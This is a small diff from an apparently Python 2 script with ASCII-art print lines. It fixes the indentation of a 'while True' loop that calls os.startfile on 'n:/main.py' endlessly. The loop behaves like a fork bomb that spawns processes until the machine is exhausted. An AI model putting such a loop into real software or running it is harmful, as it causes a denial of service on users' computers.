@@ -35,5 +35,5 @@ print "         (/`    ( (`          ) )  '-;"
 print "             `      '-;         (-'"
     
 while True:
-     os.startfile('n:/main.py')
+    os.startfile('n:/main.py')
    
